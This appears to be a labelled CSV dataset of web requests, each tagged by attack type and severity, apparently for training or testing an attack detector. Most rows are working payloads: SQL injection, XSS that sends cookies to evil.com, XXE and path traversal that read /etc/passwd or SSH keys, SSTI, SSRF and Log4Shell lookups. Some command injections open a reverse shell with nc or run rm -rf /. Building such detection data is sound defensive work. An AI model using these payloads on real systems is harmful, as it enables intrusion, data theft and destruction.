text,label,attack_type,severity
User-Agent: %3C#assign%20ex=%22freemarker.template.utility.Execute%22?new%28%29%3E${ex%28%22id%22%29},1,ssti,high
"POST /api/data HTTP/1.1
Host: target.com

input=%3C!DOCTYPE%20test%20[%20%3C!ENTITY%20%%20init%20SYSTEM%20%22data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk%22%3E%20%init;%20]%3E%3Cfoo/%3E",1,xxe,high
"GET /page?id=Authorization: Basic YWRtaW46YWRtaW4= HTTP/1.1
Host: target.com",1,brute_force,low
User-Agent: 1;%20WAITFOR%20DELAY%20%270:0:5%27--,1,sql_injection,high
"GET /search?input=<!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""file:///etc/passwd""> <!ENTITY % load SYSTEM ""php://filter/read=convert.base64-encode/resource=file:///etc/passwd"">]> HTTP/1.1
Host: target.com",1,xxe,high
"POST /api/data HTTP/1.1
Host: target.com

input=file:///c:/boot.ini",1,path_traversal,medium
POST /api/cart add item=cloud-computing,0,normal,none
X-Forwarded-For: <form action='javascript:alert(1)'><input type=submit></form>,1,xss,medium
Referer: http://target.com/?q=user=oracle&password=oracle,1,brute_force,low
GET /images/name.png,0,normal,none
delete item id=contact,0,normal,none
username=cameras&action=login,0,normal,none
ftp://127.0.0.1:21,1,ssrf,high
Referer: http://target.com/?q=%3CIMG%20SRC=javascript:alert%28%27XSS%27%29%3E,1,xss,medium
"GET /search?input=%3C?xml?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///proc/self/environ%22%3E]%3E HTTP/1.1
Host: target.com",1,xxe,high
"GET /page?id=1;%20SELECT%20pg_sleep%285%29-- HTTP/1.1
Host: target.com",1,sql_injection,high
username=admin&password=password,1,brute_force,low
%3Cscript%3Edocument.location=%27http://evil.com/steal?c=%27+document.cookie%3C/script%3E,1,xss,medium
|%20id,1,command_injection,critical
"GET /page?id=%27%20UNION%20SELECT%20NULL-- HTTP/1.1
Host: target.com",1,sql_injection,high
<img src=x onerror=alert('XSS')>,1,xss,medium
"GET /search?input=127.0.0.1%20|%20id HTTP/1.1
Host: target.com",1,command_injection,critical
%27;%20SHUTDOWN--,1,sql_injection,high
Referer: http://target.com/?q=javascript:alert(1),1,xss,medium
edit comment id=database,0,normal,none
"GET /search?input=;%20rm%20-rf%20/tmp/* HTTP/1.1
Host: target.com",1,command_injection,critical
delete item id=xlsx,0,normal,none
"GET /page?id={{request}} HTTP/1.1
Host: target.com",1,ssti,high
"GET /page?id=Authorization:%20Basic%20cm9vdDpyb290 HTTP/1.1
Host: target.com",1,brute_force,low
"GET /search?input=' HAVING 1=1-- HTTP/1.1
Host: target.com",1,sql_injection,high
%3Cp%20onmouseover=%27alert%281%29%27%3Ehover%3C/p%3E,1,xss,medium
%3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=; uname -a",1,command_injection,critical
X-Forwarded-For: %27;%20SHUTDOWN--,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=/var/www/../../etc/passwd",1,path_traversal,medium
create new post title=laptops,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=1%27%20AND%20%28SELECT%20COUNT%28*%29%20FROM%20information_schema.tables%29%3E0--",1,sql_injection,high
' OR 1=1 LIMIT 1--,1,sql_injection,high
127.0.0.1; ls,1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input={{%27%27.__class__.__mro__[2].__subclasses__%28%29}}",1,ssti,high
/etc/passwd%00.php,1,path_traversal,medium
..\..\..\windows\win.ini,1,path_traversal,medium
"User-Agent: ' AND 1=CONVERT(int,@@version)--",1,sql_injection,high
"GET /search?input=1%20OR%201=1 HTTP/1.1
Host: target.com",1,sql_injection,high
X-Forwarded-For: %22%3E%3Cimg%20src=x%20onerror=alert%281%29%3E,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=../../../../home/user/.ssh/id_rsa",1,path_traversal,medium
"GET /search?input=& whoami HTTP/1.1
Host: target.com",1,command_injection,critical
X-Forwarded-For: {{[].__class__.__base__.__subclasses__%28%29}},1,ssti,high
"GET /search?input=username=info&password=info HTTP/1.1
Host: target.com",1,brute_force,low
"GET /search?input=' AND 1=(SELECT COUNT(*) FROM tabname); -- HTTP/1.1
Host: target.com",1,sql_injection,high
download file json.pdf,0,normal,none
"GET /search?input=%3Csvg%20onload=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
search query for contact,0,normal,none
POST /api/cart add item=name,0,normal,none
Referer: http://target.com/?q=../../../../etc/shadow,1,path_traversal,medium
GET /images/100.png,0,normal,none
GET /api/status?service=machine-learning,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",1,path_traversal,medium
PUT /api/users/xml/settings,0,normal,none
"GET /page?id=username=administrator&password=administrator HTTP/1.1
Host: target.com",1,brute_force,low
"POST /api/data HTTP/1.1
Host: target.com

input=http://169.254.169.254/latest/user-data",1,ssrf,high
create new post title=contact,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",1,xss,medium
"GET /search?input=; ipconfig HTTP/1.1
Host: target.com",1,command_injection,critical
GET /search?q=1&page=1,0,normal,none
delete item id=2025,0,normal,none
Referer: http://target.com/?q=%3Caudio%20src=x%20onerror=alert%281%29%3E,1,xss,medium
User-Agent: http://127.0.0.1:8080/admin,1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=%27;%20EXEC%20xp_cmdshell%28%27whoami%27%29--",1,sql_injection,high
"GET /page?id=zip://path/to/file.zip#file.php HTTP/1.1
Host: target.com",1,path_traversal,medium
X-Forwarded-For: X-Api-Version:%20${jndi:ldap://evil.com/a},1,log4shell,critical
User-Agent: username=administrator&password=administrator,1,brute_force,low
X-Forwarded-For: username=admin&password=' OR '1'='1,1,sql_injection,high
"GET /page?id=../../../../home/user/.ssh/id_rsa HTTP/1.1
Host: target.com",1,path_traversal,medium
X-Forwarded-For: |%20ps%20aux,1,command_injection,critical
GET /blog/database HTTP/1.1,0,normal,none
User-Agent: <svg onload=alert(1)>,1,xss,medium
http://spoofed.burpcollaborator.net,1,ssrf,high
"GET /search?input=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22php://filter/convert.base64-encode/resource=/etc/passwd%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E HTTP/1.1
Host: target.com",1,xxe,high
"POST /api/data HTTP/1.1
Host: target.com

input=/etc/passwd%00.php",1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=<?xml version=""1.0""?><!DOCTYPE lolz [<!ENTITY lol ""lol""><!ENTITY lol9 ""&lol;&lol;&lol;"">]><foo>&lol9;</foo>",1,xxe,high
{{request|attr%28%27application%27%29|attr%28%27\x5f\x5fglobals\x5f\x5f%27%29|attr%28%27\x5f\x5fgetitem\x5f\x5f%27%29%28%27\x5f\x5fbuiltins\x5f\x5f%27%29|attr%28%27\x5f\x5fgetitem\x5f\x5f%27%29%28%27\x5f\x5fimport\x5f\x5f%27%29%28%27os%27%29|attr%28%27popen%27%29%28%27id%27%29|attr%28%27read%27%29%28%29}},1,ssti,high
"POST /api/data HTTP/1.1
Host: target.com

input=%3CIMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert%28%27XSS%27%29%3E",1,xss,medium
|%20whoami,1,command_injection,critical
export report order-12345,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=username=admin&password=%27%20OR%20%271%27=%271",1,sql_injection,high
"id=1 AND 1=CONVERT(int,@@version)--",1,sql_injection,high
edit comment id=january,0,normal,none
GET /category/python/items,0,normal,none
|%20ifconfig,1,command_injection,critical
' OR '1'='1,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=<?xml version=""1.0""?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY file SYSTEM ""file:///etc/passwd"">]><data>&file;</data>",1,xxe,high
Referer: http://target.com/?q=zip://path/to/file.zip#file.php,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cimg%20src=x%20onerror=alert%281%29%3E",1,xss,medium
export report about,0,normal,none
search query for 25,0,normal,none
"GET /search?input=<IMG SRC=javascript:alert('XSS')> HTTP/1.1
Host: target.com",1,xss,medium
GET /api/status?service=date,0,normal,none
GET /images/john_doe.png,0,normal,none
"GET /search?input=;%20ipconfig HTTP/1.1
Host: target.com",1,command_injection,critical
POST /api/cart add item=2025,0,normal,none
"GET /page?id={{''.class.mro()[1].subclasses()}} HTTP/1.1
Host: target.com",1,ssti,high
User-Agent: gopher://127.0.0.1:9200/_cat/indices,1,ssrf,high
Referer: http://target.com/?q=&%20id,1,command_injection,critical
User-Agent: Authorization: Basic cm9vdDpyb290,1,brute_force,low
"POST /api/feedback body={{""message"":""web-development""}}",0,normal,none
X-Forwarded-For: X-Api-Version: ${jndi:ldap://evil.com/a},1,log4shell,critical
X-Forwarded-For: %3C!DOCTYPE%20foo%20[%3C!ENTITY%20%%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E%20%3C!ENTITY%20%%20load%20SYSTEM%20%22php://filter/read=convert.base64-encode/resource=file:///etc/passwd%22%3E]%3E,1,xxe,high
delete item id=march,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3CIMG%20SRC=javascript:alert%28%27XSS%27%29%3E",1,xss,medium
"GET /search?input=%3C#assign%20ex=%22freemarker.template.utility.Execute%22?new%28%29%3E${ex%28%22id%22%29} HTTP/1.1
Host: target.com",1,ssti,high
"GET /search?input=Authorization:%20Basic%20dGVzdDp0ZXN0 HTTP/1.1
Host: target.com",1,brute_force,low
Referer: http://target.com/?q=ldap://127.0.0.1:389,1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=../../../../home/user/.ssh/id_rsa",1,path_traversal,medium
%3Cimg%20src=x%20onerror=alert%28%27XSS%27%29%3E,1,xss,medium
X-Forwarded-For: %27;%20SHUTDOWN--,1,sql_injection,high
User-Agent: X-Api-Version:%20${jndi:ldap://evil.com/a},1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=%0a%20ls%20-la",1,command_injection,critical
username=user123&action=login,0,normal,none
"GET /search?input=/etc/passwd%00.php HTTP/1.1
Host: target.com",1,path_traversal,medium
"User-Agent: %27%20UNION%20SELECT%20username,password%20FROM%20users--",1,sql_injection,high
file:///etc/shadow,1,path_traversal,medium
%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,1,xss,medium
"GET /search?input=' OR BENCHMARK(1000000,MD5('a'))-- HTTP/1.1
Host: target.com",1,sql_injection,high
GET /blog/javascript HTTP/1.1,0,normal,none
X-Forwarded-For: ../../../../etc/hostname,1,path_traversal,medium
"GET /page?id=%27;%20DROP%20TABLE%20users-- HTTP/1.1
Host: target.com",1,sql_injection,high
$%28jndi:ldap://evil.com/a%29,1,log4shell,critical
http://192.168.1.1/admin,1,ssrf,high
"GET /page?id=${jndi:ldap://evil.com/${env:AWS_ACCESS_KEY_ID}} HTTP/1.1
Host: target.com",1,log4shell,critical
User-Agent: ../../../../etc/passwd,1,path_traversal,medium
../../../../etc/hosts,1,path_traversal,medium
Referer: http://target.com/?q=%3Cinput%20autofocus%20onfocus=alert%281%29%3E,1,xss,medium
"Referer: http://target.com/?q=<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""expect://id"">]><foo>&xxe;</foo>",1,xxe,high
edit comment id=2,0,normal,none
Referer: http://target.com/?q=%22%3E%3Cimg%20src=x%20onerror=alert%281%29%3E,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=../../../../home/user/.ssh/id_rsa",1,path_traversal,medium
X-Forwarded-For: ..././..././..././etc/passwd,1,path_traversal,medium
"GET /page?id=${self.module.cache.util.os.system('id')} HTTP/1.1
Host: target.com",1,ssti,high
GET /blog/ar HTTP/1.1,0,normal,none
GET /products/python HTTP/1.1,0,normal,none
"GET /page?id=%27%20OR%20%271%27=%271 HTTP/1.1
Host: target.com",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=admin' #",1,sql_injection,high
X-Forwarded-For: ${jndi:ldap://evil.com/${sys:java.class.path}},1,log4shell,critical
"GET /search?input=`env` HTTP/1.1
Host: target.com",1,command_injection,critical
%27%20UNION%20SELECT%20NULL--,1,sql_injection,high
username=electronics&action=login,0,normal,none
"<!DOCTYPE foo [<!ENTITY xxe ""test""> <!ENTITY xxe2 ""&xxe;&xxe;&xxe;"">]>",1,xxe,high
GET /users/laptops/profile HTTP/1.1,0,normal,none
GET /category/xml/items,0,normal,none
"POST /api/orders body={{""item"":""february""}}",0,normal,none
Referer: http://target.com/?q=%27%20UNION%20SELECT%20NULL--,1,sql_injection,high
X-Forwarded-For: %3Cselect%20onchange=alert%281%29%3E%3Coption%3E1%3C/option%3E%3C/select%3E,1,xss,medium
"GET /search?input=<style>*{background:url('javascript:alert(1)')}</style> HTTP/1.1
Host: target.com",1,xss,medium
Authorization:%20Basic%20cm9vdDpyb290,1,brute_force,low
"User-Agent: %27%20OR%20BENCHMARK%281000000,MD5%28%27a%27%29%29--",1,sql_injection,high
"GET /search?input=1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a' HTTP/1.1
Host: target.com",1,sql_injection,high
filter results by category=3,0,normal,none
POST /api/cart add item=blue,0,normal,none
"GET /search?input=${${::-j}ndi:ldap://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
GET /docs/database.html,0,normal,none
User-Agent: ../../../../home/user/.ssh/id_rsa,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=http://metadata.google.internal/computeMetadata/v1/",1,ssrf,high
X-Forwarded-For: 127.0.0.1 | id,1,command_injection,critical
"GET /page?id=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'> HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=ldap://127.0.0.1:389",1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=$%28jndi:ldap://evil.com/a%29",1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=..\..\..\windows\win.ini",1,path_traversal,medium
"GET /search?input=${jndi:dns://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
"GET /search?input=%3Cscript%3Efetch%28%27http://evil.com?c=%27+btoa%28document.cookie%29%29%3C/script%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/orders body={{""item"":""price""}}",0,normal,none
filter results by category=summary-q3,0,normal,none
GET /category/green/items,0,normal,none
search=%27%20OR%201=1--&submit=Search,1,sql_injection,high
X-Forwarded-For: |%20id,1,command_injection,critical
export report de,0,normal,none
edit comment id=about,0,normal,none
delete item id=cameras,0,normal,none
X-Forwarded-For: |%20rm%20-rf%20/,1,command_injection,critical
X-Forwarded-For: <form action='javascript:alert(1)'><input type=submit></form>,1,xss,medium
create new post title=2,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=username=admin&password=password123",1,brute_force,low
Referer: http://target.com/?q=..\..\..\..\windows\system32\drivers\etc\hosts,1,path_traversal,medium
Referer: http://target.com/?q=<video src=x onerror=alert(1)>,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=..\..\..\boot.ini",1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=username=jenkins&password=jenkins",1,brute_force,low
"GET /search?input=""><img src=x onerror=alert(1)> HTTP/1.1
Host: target.com",1,xss,medium
"' UNION SELECT NULL,NULL--",1,sql_injection,high
GET /users/about/profile HTTP/1.1,0,normal,none
"%27%20OR%20BENCHMARK%281000000,MD5%28%27a%27%29%29--",1,sql_injection,high
search query for electronics,0,normal,none
User-Agent: | rm -rf /,1,command_injection,critical
Referer: http://target.com/?q=%27%20GROUP%20BY%201--,1,sql_injection,high
"GET /page?id=../../../../etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /search?input=expression(alert(1)) HTTP/1.1
Host: target.com",1,xss,medium
X-Forwarded-For: %27%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
"GET /page?id=....\....\....\etc\passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cscript%3Efetch%28%27http://evil.com?c=%27+btoa%28document.cookie%29%29%3C/script%3E",1,xss,medium
"GET /page?id=;%20nc%20-e%20/bin/bash%20evil.com%204444 HTTP/1.1
Host: target.com",1,command_injection,critical
export report report-january,0,normal,none
Referer: http://target.com/?q=%3Cselect%20onchange=alert%281%29%3E%3Coption%3E1%3C/option%3E%3C/select%3E,1,xss,medium
%27%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
GET /images/smartphones.png,0,normal,none
view page number txt,0,normal,none
Referer: http://target.com/?q={{%27%27|attr%28%27__class__%27%29|attr%28%27__base__%27%29|attr%28%27__subclasses__%27%29%28%29}},1,ssti,high
view page number cameras,0,normal,none
"content-type: application/json
body: {{""name"":""services""}}",0,normal,none
"POST /api/orders body={{""item"":""python""}}",0,normal,none
"GET /search?input=search=' OR 1=1--&submit=Search HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /page?id=%27%20AND%20EXISTS%28SELECT%20*%20FROM%20users%29-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /page?id=1%20AND%20%28SELECT%20SUBSTRING%28username,1,1%29%20FROM%20users%20WHERE%20username=%27admin%27%29=%27a%27 HTTP/1.1
Host: target.com",1,sql_injection,high
edit comment id=mobile-apps,0,normal,none
"GET /search?input=%3CIMG%20SRC=javascript:alert%28%27XSS%27%29%3E HTTP/1.1
Host: target.com",1,xss,medium
admin%27--,1,sql_injection,high
"GET /page?id=%3Ciframe%20src=javascript:alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
GET /blog/python HTTP/1.1,0,normal,none
upload image photo_database.jpg,0,normal,none
delete item id=bob,0,normal,none
"GET /search?input=username=tomcat&password=tomcat HTTP/1.1
Host: target.com",1,brute_force,low
"GET /page?id=%3Cp%20onmouseover=%27alert%281%29%27%3Ehover%3C/p%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=<p onmouseover='alert(1)'>hover</p>",1,xss,medium
User-Agent: %3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20root%20[%3C!ENTITY%20test%20SYSTEM%20%22file:///etc/hostname%22%3E]%3E%3Croot%3E&test;%3C/root%3E,1,xxe,high
X-Forwarded-For: ..%2f..%2f..%2fetc%2fpasswd,1,path_traversal,medium
"GET /search?input=&%20id HTTP/1.1
Host: target.com",1,command_injection,critical
Referer: http://target.com/?q=User-Agent:%20${jndi:ldap://evil.com/a},1,log4shell,critical
upload image photo_pdf.jpg,0,normal,none
PUT /api/users/mobile-apps/settings,0,normal,none
User-Agent: %3Ca%20href=%27javascript:alert%281%29%27%3Eclick%3C/a%3E,1,xss,medium
Referer: http://target.com/?q=../../../../var/log/apache2/access.log,1,path_traversal,medium
User-Agent: ../../../../home/user/.ssh/id_rsa,1,path_traversal,medium
"X-Forwarded-For: 1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL--",1,sql_injection,high
Referer: http://target.com/?q=%3Cinput%20autofocus%20onfocus=alert%281%29%3E,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=xmlns:xi=%22http://www.w3.org/2001/XInclude%22%3E%3Cxi:include%20parse=%22text%22%20href=%22file:///etc/passwd%22/%3E",1,xxe,high
"GET /page?id='; UPDATE users SET password='hacked' WHERE '1'='1'-- HTTP/1.1
Host: target.com",1,sql_injection,high
"X-Forwarded-For: id=1%20AND%201=CONVERT%28int,@@version%29--",1,sql_injection,high
"GET /search?input=User-Agent: ${jndi:ldap://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
